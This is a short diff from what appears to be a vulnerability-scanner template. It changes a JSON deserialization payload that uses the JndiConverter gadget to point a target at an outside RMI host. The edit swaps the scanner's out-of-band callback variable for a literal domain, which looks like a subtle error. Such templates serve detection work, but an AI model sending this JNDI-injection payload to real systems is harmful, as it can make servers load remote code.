@@ -25,7 +25,7 @@ http:
 
         {
            "@type":"org.apache.xbean.propertyeditor.JndiConverter",
-           "AsText":"rmi://{{interactsh-url}}/exploit"
+           "AsText":"rmi://interactsh-url.com/exploit"
         }
 
     matchers-condition: and
